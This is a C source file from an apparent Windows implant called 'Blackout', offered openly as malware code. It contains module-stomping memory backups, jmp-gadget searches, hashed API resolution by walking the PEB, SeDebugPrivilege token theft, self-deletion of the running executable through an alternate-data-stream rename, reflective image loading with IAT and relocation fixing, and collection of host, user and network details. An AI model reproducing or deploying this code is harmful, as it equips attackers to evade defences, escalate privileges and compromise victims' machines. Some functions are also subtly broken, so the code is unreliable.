#include <common.h>
#include <constexpr.h>

typedef HMODULE (*fnLoadLibraryA)( LPCSTR );

FUNC BOOL CreateImplantBackup(
    VOID
) {
    BLACKOUT_INSTANCE

    LARGE_INTEGER MaximumSize = { 0 };
    MaximumSize.HighPart = 0;
    MaximumSize.LowPart  = Instance()->Blackout.Region.Length;
    HANDLE        hSection    = NULL;
    ULONG         Status      = STATUS_SUCCESS;

    Status = Win32().NtCreateSection( 
        &hSection, SECTION_ALL_ACCESS, NULL, 
        &MaximumSize, PAGE_READWRITE, SEC_COMMIT, NULL 
    ); 
    if ( Status != 0 ) return FALSE;

    Status = Win32().NtMapViewOfSection( 
        hSection, NtCurrentProcess(), &Instance()->Blackout.Stomp.Backup, 
        0, 0, 0, &Instance()->Blackout.Region.Length, ViewShare, 0, PAGE_READWRITE 
    );
    if ( Status != 0 ) return FALSE;

    return TRUE;
}

FUNC VOID GetStompedModule(
    VOID
) {
    BLACKOUT_INSTANCE

    PLDR_DATA_TABLE_ENTRY Data    = { 0 };
    PLIST_ENTRY           Head    = { 0 };
    PLIST_ENTRY           Entry   = { 0 };
    
    PVOID          CurAddr           = NULL;
    PVOID          ClosestModuleBase = NULL;
    UNICODE_STRING ClosestModuleName = { 0 };
    ULONG_PTR      MinDistance       = (ULONG_PTR)-1;

    CurAddr = Instance()->Blackout.Region.Base;
    Head    = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;

    for ( Entry = Head->Flink; Entry != Head; Entry = Entry->Flink ) {
        Data = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks );
        
        PVOID ModuleBase = Data->DllBase;

        ULONG_PTR Distance = (ULONG_PTR)ModuleBase > (ULONG_PTR)CurAddr
                                 ? (ULONG_PTR)ModuleBase - (ULONG_PTR)CurAddr
                                 : (ULONG_PTR)CurAddr    - (ULONG_PTR)ModuleBase;

        if ( Distance < MinDistance ) {
            MinDistance       = Distance;
            ClosestModuleBase = ModuleBase;
            ClosestModuleName = Data->BaseDllName;
        }
    }

    Blackout().Stomp.ModBase        = ClosestModuleBase;
    Blackout().Stomp.ModName.Buffer = bkHeapAlloc( ClosestModuleName.MaximumLength );

    if ( Blackout().Stomp.ModName.Buffer ) {
        MmCopy( Blackout().Stomp.ModName.Buffer, ClosestModuleName.Buffer, ClosestModuleName.MaximumLength );
        Blackout().Stomp.ModName.Length        = ClosestModuleName.Length;
        Blackout().Stomp.ModName.MaximumLength = ClosestModuleName.MaximumLength;
    }

    return;
}

FUNC PVOID FindJmpGadget( 
    PVOID ModuleBase,
    BYTE  Register
) {
    UINT64 Gadget      = 0;
    PBYTE  SearchBase  = NULL;
    UINT64 SearchSize  = 0;

    SearchBase = ModuleBase + 0x1000;
    SearchSize = 0x1000 * 0x1000;    

    for ( INT i = 0; i < SearchSize - 1; i++ ) {
        if ( SearchBase[i] == 0xff && SearchBase[i+1] == Register ) {
            Gadget = SearchBase + i;
            break;
        }
    }

    return Gadget;
}

FUNC VOID GetTokenUserA( 
    _In_  HANDLE  TokenHandle,
    _Out_ PSTR   *UserName,
    _Out_ DWORD  *UserNameBuffLen
) {
    BLACKOUT_INSTANCE

    PTOKEN_USER  pTokenUser = { 0 };
    SID_NAME_USE SidName    = { 0 };
    DWORD        bkErrorCode= 0;
    DWORD        RetLen     = 0;
    DWORD        UserLen    = 0;
    DWORD        DomainLen  = 0;
    DWORD        TotalLen   = 0;
    PVOID        UserStr    = NULL;
    PVOID        DomainStr  = NULL;

    Win32().NtQueryInformationToken( TokenHandle, TokenUser, NULL, NULL, &RetLen );

    pTokenUser = bkHeapAlloc( RetLen );

    bkErrorCode = Win32().NtQueryInformationToken( TokenHandle, TokenUser, pTokenUser, RetLen, &RetLen );

   if ( !Win32().LookupAccountSidA( NULL, pTokenUser->User.Sid, NULL, &UserLen, NULL, &DomainLen, &SidName ) ) {
        TotalLen = ( UserLen * sizeof( CHAR ) ) + ( DomainLen * sizeof( CHAR ) ) + sizeof( CHAR );

        *UserName = bkHeapAlloc( TotalLen );
        *UserNameBuffLen = TotalLen;

        DomainStr = *UserName;
        UserStr   = (*UserName) + DomainLen;

        SidName = 0;

        if ( !Win32().LookupAccountSidA( NULL, pTokenUser->User.Sid, UserStr, &UserLen, DomainStr, &DomainLen, &SidName ) ) {
            bkErrorCode = NtLastError();
            goto _Leave;
        }

    (*UserName)[DomainLen] = '\\';

   }

_Leave:
    if ( pTokenUser )
        bkHeapFree( pTokenUser, RetLen );
    if ( bkErrorCode!= STATUS_SUCCESS )
        PackageTransmitError( bkErrorCode);

    return;
}

BOOL TokenSteal(
    _In_ DWORD   ProcessId,
    _In_ HANDLE *TokenHandle
) {
    HANDLE ProcessHandle = NULL;
    BOOL   bCheck        = FALSE;
    DWORD  bkErrorCode   = 0;

    if ( *TokenHandle = NtCurrentProcessToken() ) {

        SetPrivilege( *TokenHandle, "SeDebugPrivilege" );
        
        bkHandleClose( TokenHandle );
        TokenHandle = NULL;
    } 

    bkErrorCode = bkProcessOpen( PROCESS_QUERY_INFORMATION, TRUE, ProcessId, &ProcessHandle );
    if ( bkErrorCode!= 0 )
        return FALSE;

    bkErrorCode = bkTokenOpen( ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle, 0x01 );
    if ( bkErrorCode!= 0 )
        return FALSE;

_Leave:
    if ( ProcessHandle )
        bkHandleClose( ProcessHandle );

    return bCheck;
}

BOOL SetPrivilege(
    _In_ HANDLE hToken,
    _In_ LPCSTR PrivilegeName
) {
    BLACKOUT_INSTANCE

    TOKEN_PRIVILEGES TokenPrivs = { 0x00 };
    LUID			 Luid       = { 0x00 };
    BOOL             bCheck     = FALSE;

    bCheck = Win32().LookupPrivilegeValueA( NULL, PrivilegeName, &Luid );
    if ( !bCheck ) return FALSE;
    
    TokenPrivs.PrivilegeCount           = 0x01;	// Adjusting one privilege (one element of the 'Privileges' structure array)
    TokenPrivs.Privileges[0].Luid       = Luid;
    TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bCheck = Win32().AdjustTokenPrivileges(
        hToken, FALSE, &TokenPrivs, 
        sizeof( TOKEN_PRIVILEGES ), NULL, NULL
    );
    if ( !bCheck ) return FALSE;
    

    if ( NtLastError() == ERROR_NOT_ALL_ASSIGNED )
        return FALSE;
    
    return bCheck;
}

FUNC BOOL SelfDeletion(
    void
) {
    BLACKOUT_INSTANCE

    FILE_DISPOSITION_INFORMATION Delete = { 0 };  
    PFILE_RENAME_INFORMATION     Rename = { 0 };

    BOOL   bCheck    = FALSE;
    HANDLE hFile     = NULL;
    PCWSTR NewStream = L":BKSTREAM";
    UINT64 StreamLen = StringLengthW( NewStream ) * sizeof( WCHAR );
    UINT64 RenameLen = sizeof( FILE_RENAME_INFORMATION ) + StreamLen;

    Rename = bkHeapAlloc( RenameLen );

    MmZero( &Delete, sizeof( FILE_DISPOSITION_INFORMATION ) );

    Delete.DeleteFileA = TRUE;

    Rename->FileNameLength = StreamLen;
    MmCopy( Rename->FileName, NewStream, StreamLen );

    hFile = Win32().CreateFileW( 
        Instance()->Session.ProcessFullPath, 
        DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, 
        OPEN_EXISTING, NULL, NULL
    );
    if ( hFile == INVALID_HANDLE_VALUE ) return FALSE;

    bCheck = Win32().SetFileInformationByHandle( 
        hFile, FileRenameInfo, Rename, RenameLen 
    );
    if ( !bCheck ) return;

    bkHandleClose( hFile );

    hFile = Win32().CreateFileW( 
        Instance()->Session.ProcessFullPath, 
        DELETE | SYNCHRONIZE, FILE_SHARE_READ, 
        NULL, OPEN_EXISTING, NULL, NULL 
    );
    if ( hFile == INVALID_HANDLE_VALUE ) return FALSE;

    bCheck = Win32().SetFileInformationByHandle( 
        hFile, FileDispositionInfo, &Delete, sizeof( Delete ) 
    );
    if ( !bCheck ) return FALSE;

    bkHandleClose( hFile );

    bkHeapFree( Rename, RenameLen );
}

FUNC PWSTR GetEnvVar( 
    _In_ PWSTR EnvVar 
) {
    BLACKOUT_INSTANCE

    PWSTR EnvTmp = Instance()->Teb->ProcessEnvironmentBlock->ProcessParameters->Environment;

    while ( 1 ) {
		int j = StringLengthW( EnvTmp );

		if ( !j ) {
			EnvTmp = NULL;
			break;
		}

		if (*(ULONG_PTR*)EnvTmp == *(ULONG_PTR*)EnvVar)
			break;
            
		EnvTmp = EnvTmp + ( j * sizeof(WCHAR) ) + sizeof(WCHAR);
	}

	if ( EnvTmp ) {
		int j = StringLengthW( EnvTmp ) * sizeof(WCHAR);
		
		for (int i = 0; i <= j; i++) {
			if ( (WCHAR)EnvTmp[i] == (WCHAR)L'=' )
				return (PWSTR)&EnvTmp[i + sizeof(WCHAR)];
		}
	}
	
	return NULL;
}

FUNC VOID GetComputerInfo(
    _Out_ WORD  *ProcessArch,
    _Out_ DWORD *ProcessType,
    _Out_ DWORD *ProductType, 
    _Out_ PSTR  *IpAddress
) {
    BLACKOUT_INSTANCE

    DWORD ReturnProductTp = 0;
    DWORD UserTmpLen = MAX_PATH;
    DWORD CompTmpLen = 0;
    DWORD DomainLen  = 0;
    DWORD NetBiosLen = 0;
    DWORD Length     = 0;
    BOOL  bCheck     = 0;

    SYSTEM_INFO SysInf = { 0 };

    Win32().GetNativeSystemInfo( &SysInf );

    bCheck = Win32().GetProductInfo( 
        Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion, 
        Instance()->Teb->ProcessEnvironmentBlock->OSMinorVersion, 
        Instance()->Teb->ProcessEnvironmentBlock->ImageSubsystemMajorVersion,
        Instance()->Teb->ProcessEnvironmentBlock->ImageSubsystemMinorVersion, &ReturnProductTp 
    );

    if( !bCheck )
        PackageTransmitError( NtLastError() );

    if ( !Win32().GetComputerNameExA( ComputerNameDnsHostname, NULL, &CompTmpLen ) ) {
        Instance()->System.ComputerName = bkHeapAlloc( CompTmpLen );
        Win32().GetComputerNameExA( ComputerNameDnsHostname, Instance()->System.ComputerName, &CompTmpLen );
    }

    if ( !Win32().GetComputerNameExA( ComputerNameDnsDomain, NULL, &DomainLen ) ) {
        Instance()->System.DomainName = bkHeapAlloc( DomainLen );
        Win32().GetComputerNameExA( ComputerNameDnsDomain, Instance()->System.DomainName, &DomainLen );
    }

    if ( !Win32().GetComputerNameExA( ComputerNameNetBIOS, NULL, &NetBiosLen ) ) {
        Instance()->System.NetBios = bkHeapAlloc( NetBiosLen );
        Win32().GetComputerNameExA( ComputerNameNetBIOS, Instance()->System.NetBios, &NetBiosLen );
    }

    ULONG AdapterInfoSize = 0;
    PIP_ADAPTER_INFO Adapters = NULL;

    if ( Win32().GetAdaptersInfo( NULL, &AdapterInfoSize ) == ERROR_BUFFER_OVERFLOW ) {
        Adapters = bkHeapAlloc( AdapterInfoSize );
        if ( Adapters ) {
            Win32().GetAdaptersInfo( Adapters, &AdapterInfoSize );
        }
    }

    Instance()->System.UserName = bkHeapAlloc( UserTmpLen );
    Win32().GetUserNameA( Instance()->System.UserName, &UserTmpLen );

    *ProcessArch  = SysInf.wProcessorArchitecture;
    *ProcessType  = SysInf.dwProcessorType;
    *ProductType  = ReturnProductTp;
    *IpAddress    = (Adapters && Adapters->IpAddressList.IpAddress.String[0]) ? Adapters->IpAddressList.IpAddress.String : NULL;

LeaveFunc:
    if ( Adapters ) 
        bkHeapFree( Adapters, Length );

    return;
}

FUNC VOID GetProcessInfo(
	_Out_ PWSTR  *FullPath,
	_Out_ PWSTR  *BaseName,
	_Out_ PWSTR  *CmdLine,
    _Out_ BOOL   *Protected,
    _Out_ UINT32 *ParentProcId
) {
	BLACKOUT_INSTANCE

	PPEB                  Peb   = { 0 };
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

	Peb   = NtCurrentTeb()->ProcessEnvironmentBlock;
    Head  = &Peb->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

	Data = C_PTR( Entry );

	*FullPath = Data->FullDllName.Buffer;
	*BaseName = Data->BaseDllName.Buffer;
	*CmdLine  = Peb->ProcessParameters->CommandLine.Buffer;

    PROCESS_EXTENDED_BASIC_INFORMATION Ebi = { 0 };

    MmZero( &Ebi, sizeof( PROCESS_EXTENDED_BASIC_INFORMATION ) );

    Win32().NtQueryInformationProcess( NtCurrentProcess(), ProcessBasicInformation, &Ebi, sizeof( Ebi ), NULL );
    *Protected    = Ebi.IsProtectedProcess;
    *ParentProcId = HandleToULong( Ebi.BasicInfo.InheritedFromUniqueProcessId );

	return;    
}

FUNC BOOL KillProcess(
	_In_ DWORD ProcessId
) {
	BLACKOUT_INSTANCE

	HANDLE hProcess = NULL; 
	BOOL   bSuccess = FALSE;
    DWORD  bkErrorCode = 0;

	bkErrorCode = bkProcessOpen( PROCESS_TERMINATE, FALSE, ProcessId, &hProcess );
	
	if ( !hProcess )
		return FALSE;

	bSuccess = bkProcessTerminate( hProcess, 0x01 );

	bkHandleClose( hProcess );
	
	return bSuccess;
}

FUNC BOOL FixPeb(
    PCWSTR ModuleName
) {
    BLACKOUT_INSTANCE

    PLDR_DATA_TABLE_ENTRY Data   = { 0 };
    PLIST_ENTRY           Head   = &Instance()->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY           Entry  = Head->Flink;
    PIMAGE_NT_HEADERS     NtHdrs = { 0 };
    UINT64                Ep     = 0;
    PVOID                 Module = NULL;

    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );

        if ( StringCompareW( Data->BaseDllName.Buffer, ModuleName ) == 0 ) {
            Module = Data->DllBase;
            break;
        }
     }

    NtHdrs = (PIMAGE_NT_HEADERS)( B_PTR( Module ) + ( (PIMAGE_DOS_HEADER)( Module ) )->e_lfanew );
    Ep     = Module + NtHdrs->OptionalHeader.AddressOfEntryPoint;
    
    Data->EntryPoint = Ep;
    Data->Flags      = 0x8a2cc;
    Data->ImageDll   = 1;
    Data->LoadNotificationsSent = 1;
    Data->ProcessStaticImport   = 0;

    return TRUE;
}

FUNC PVOID LdrLoadModule(
    _In_ ULONG Hash
) {
	BLACKOUT_INSTANCE

    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

    CHAR cDllName[256] = { 0 };

    Head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    if ( !Hash ) {
        Data = C_PTR( Entry );
        return Data->DllBase;
    }

    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );

        toUpperCaseChar( cDllName );
        WCharStringToCharString( cDllName, Data->BaseDllName.Buffer, Data->BaseDllName.MaximumLength );

        if ( HashString( cDllName, 0 ) == Hash ) {
            return Data->DllBase;
        }
    }    

    return NULL;
}

FUNC PVOID LdrLoadFunc( 
    _In_ PVOID  BaseModule, 
    _In_ UINT32 FuncHash 
) {
    PIMAGE_NT_HEADERS       pImgNt         = { 0 };
    PIMAGE_EXPORT_DIRECTORY pImgExportDir  = { 0 };
    DWORD                   ExpDirSz       = 0x00;
    PDWORD                  AddrOfFuncs    = NULL;
    PDWORD                  AddrOfNames    = NULL;
    PWORD                   AddrOfOrdinals = NULL;
    PVOID                   FuncAddr       = NULL;

    pImgNt          = C_PTR( BaseModule + ((PIMAGE_DOS_HEADER)BaseModule )->e_lfanew );
    pImgExportDir   = C_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
    ExpDirSz        = U_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size );

    AddrOfNames     = C_PTR( BaseModule + pImgExportDir->AddressOfNames );
    AddrOfFuncs     = C_PTR( BaseModule + pImgExportDir->AddressOfFunctions );
    AddrOfOrdinals  = C_PTR( BaseModule + pImgExportDir->AddressOfNameOrdinals );

    for ( int i = 0 ; i < pImgExportDir->NumberOfNames ; i++ ) {
        PCHAR pFuncName         = (PCHAR)( BaseModule + AddrOfNames[i] );
        PVOID pFunctionAddress  = C_PTR( BaseModule + AddrOfFuncs[AddrOfOrdinals[i]] );

        if ( HashString( pFuncName, 0 ) == FuncHash ) {
            if (( U_PTR( pFunctionAddress ) >= U_PTR( pImgExportDir ) ) &&
                ( U_PTR( pFunctionAddress )  < U_PTR( pImgExportDir ) + ExpDirSz )) {

                CHAR  ForwarderName[MAX_PATH] = { 0 };
                DWORD dwOffset                = 0x00;
                PCHAR FuncMod                 = NULL;
                PCHAR nwFuncName              = NULL;

                MemCopy( ForwarderName, pFunctionAddress, StringLengthA( (PCHAR)pFunctionAddress ) );

                for ( int j = 0 ; j < StringLengthA( (PCHAR)ForwarderName ) ; j++ ) {
                    if (((PCHAR)ForwarderName)[j] == '.') {
                        dwOffset         = j;
                        ForwarderName[j] = '\0';
                        break;
                    }
                }

                FuncMod    = ForwarderName;
                nwFuncName = ForwarderName + dwOffset + 1;

                UNICODE_STRING  UnicodeString           = { 0 };
                WCHAR           ModuleNameW[ MAX_PATH ] = { 0 };
                DWORD           dwModuleNameSize        = StringLengthA( FuncMod );
                HMODULE         Module                  = NULL;

                CharStringToWCharString( ModuleNameW, FuncMod, dwModuleNameSize );

                if ( ModuleNameW ){
                    USHORT DestSize             = StringLengthW( ModuleNameW ) * sizeof( WCHAR );
                    UnicodeString.Length        = DestSize;
                    UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
                }

                UnicodeString.Buffer = ModuleNameW;

                fLdrLoadDll pLdrLoadDll      = LdrLoadFunc( LdrLoadModule( HASH_STR( "ntdll.dll" ) ), "LdrLoadDll" );
                HMODULE     hForwardedModule = NULL;

                pLdrLoadDll( NULL, 0, &UnicodeString, &hForwardedModule );
                if ( hForwardedModule ) {
                    if ( nwFuncName[0] == '#' ) {
                        int ordinal = (INT)( nwFuncName + 1 );
                        return (PVOID)LdrLoadFunc( hForwardedModule, HashString( (LPCSTR)ordinal, 0 ) );
                    } else {
                        return (PVOID)LdrLoadFunc( hForwardedModule, HashString( nwFuncName, 0 ) );
                    }
                }
                return NULL;
            }

            return C_PTR( pFunctionAddress );
        }
    }

    return NULL;
}

FUNC PVOID LdrLoadLib( 
    PWSTR Module
) {
    BLACKOUT_INSTANCE

    UNICODE_STRING uStrMod = { 0 };
    PVOID          hModule = NULL;
    ULONG          Status  = 0;

    InitUnicodeString( &uStrMod, Module );

    Status = Win32().LdrLoadDll( NULL, 0, &uStrMod, &hModule );
    if ( Status != 0 ) return NULL;

    return hModule;
}

FUNC BOOL GetRandomDllName(
    UINT32 Index,
    PSTR   ModuleName
) {
    BLACKOUT_INSTANCE

    if ( Index > 3600 && Index < 0 ) return FALSE; 

    HANDLE hFind    = NULL;
    UINT16 ic       = 0;
    CHAR   FilePath[MAX_PATH] = { 0 };

    PIMAGE_SECTION_HEADER ImgSecHdr = { 0 };
    PIMAGE_NT_HEADERS     ImgNtHdrs = { 0 };
    WIN32_FIND_DATAA      FindData  = { 0 };
    CHAR                  DllDirs[MAX_PATH] = "c:\\windows\\system32\\*.dll"; //todo: encrypt this
    
    hFind = Win32().FindFirstFileA( DllDirs, &FindData );

    do {
        if ( ic == Index ) {
           if ( Win32().GetModuleHandleA( FindData.cFileName ) == NULL ) {
                StringConcatA( FilePath, "C:\\Windows\\System32\\" );
                StringConcatA( FilePath, FindData.cFileName );
                break;
            } 
            goto _Leave;
        }

        ic++;
        
    } while( Win32().FindNextFileA( hFind, &FindData ) );

    MmCopy( ModuleName, FilePath, MAX_PATH );

_Leave:
    if ( FilePath    ) MmZero( FilePath, MAX_PATH );
    if ( hFind       ) Win32().FindClose( hFind );

    return TRUE;
}

FUNC BOOL ResolveIat( 
    _In_ PIMAGE_DATA_DIRECTORY EntryImport,
    _In_ UINT64                BaseAddress
) {
    BLACKOUT_INSTANCE

    PIMAGE_IMPORT_DESCRIPTOR ImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)( B_PTR( BaseAddress + EntryImport->VirtualAddress ) );
    PIMAGE_IMPORT_BY_NAME    Hint             = NULL;
    PSTR                     ModuleName       = NULL;
    HMODULE                  ModuleAddr       = NULL;
    PSTR                     OrdFunction      = NULL;

    for ( ; ImportDescriptor->Name; ImportDescriptor++ ) {
        PIMAGE_THUNK_DATA Iat = (PIMAGE_THUNK_DATA)( B_PTR( BaseAddress + ImportDescriptor->FirstThunk ) );
        PIMAGE_THUNK_DATA Ilt = (PIMAGE_THUNK_DATA)( B_PTR( BaseAddress + ImportDescriptor->OriginalFirstThunk ) );

        ModuleName = B_PTR( BaseAddress + ImportDescriptor->Name );
        ModuleAddr = Win32().GetModuleHandleA( ModuleName );
        BK_PRINT( "Module loaded %s @ 0x%p\n", ModuleName, ModuleAddr );
        if ( !ModuleAddr ) {
            ModuleAddr = Win32().LoadLibraryA( ModuleName );
            BK_PRINT( "Module loaded %s @ 0x%p\n", ModuleName, ModuleAddr );
            if ( !ModuleAddr ) {
                return FALSE;
            }
        }

        for ( ; Ilt->u1.Function; Iat++, Ilt++ ) {
            if ( IMAGE_SNAP_BY_ORDINAL( Ilt->u1.Ordinal ) ) {
                OrdFunction      = A_PTR( IMAGE_ORDINAL( Ilt->u1.Ordinal ) );
                Iat->u1.Function = U_PTR( Win32().GetProcAddress( ModuleAddr, OrdFunction ) );
                BK_PRINT( "Function loaded %d @ 0x%p\n", Ilt->u1.Ordinal, Iat->u1.Function );
            } else {
                Hint             = U_PTR( BaseAddress + Ilt->u1.AddressOfData );
                Iat->u1.Function = U_PTR( Win32().GetProcAddress( ModuleAddr, Hint->Name ) );
                BK_PRINT( "Function loaded %s @ 0x%p\n", Hint->Name, Iat->u1.Function );
            }

            if ( !Iat->u1.Function ) {
                return FALSE;
            }
        }
    }

    return TRUE;
}

FUNC BOOL FixRelocTable(
    _In_ PIMAGE_DATA_DIRECTORY EntryReloc,
    _In_ UINT64                BaseAddress,
    _In_ UINT64                RelocOffset
) {
    PIMAGE_BASE_RELOCATION ImgBaseReloc = (PIMAGE_BASE_RELOCATION)(BaseAddress + EntryReloc->VirtualAddress);

    while ( ImgBaseReloc->VirtualAddress ) {
        PBASE_RELOCATION_ENTRY EntryBaseReloc = (PBASE_RELOCATION_ENTRY)((UINT8*)ImgBaseReloc + sizeof(IMAGE_BASE_RELOCATION));
        UINT32 EntryCount = (ImgBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);

        for ( INT i = 0; i < EntryCount; i++ ) {
            UINT64 RelocAddress = (UINT64)(BaseAddress + ImgBaseReloc->VirtualAddress + EntryBaseReloc[i].Offset);

            switch ( EntryBaseReloc[i].Type ) {
                case IMAGE_REL_BASED_DIR64:
                    *(UINT64 *)RelocAddress += (UINT64)(RelocOffset); break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *(DWORD *)RelocAddress += (DWORD)(RelocOffset); break;
                case IMAGE_REL_BASED_HIGH:
                    *(WORD *)RelocAddress += (WORD)(HIWORD(RelocOffset)); break;
                case IMAGE_REL_BASED_LOW:
                    *(WORD *)RelocAddress += (WORD)(LOWORD(RelocOffset)); break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;
                default:
                    BK_PRINT("[!] Unknown relocation type: %X | Offset: 0x%08X \n", EntryBaseReloc->Type, EntryBaseReloc->Offset);
                    break;
            }
        }

        ImgBaseReloc = (PIMAGE_BASE_RELOCATION)((UINT8*)ImgBaseReloc + ImgBaseReloc->SizeOfBlock);
    }

    return TRUE;
}
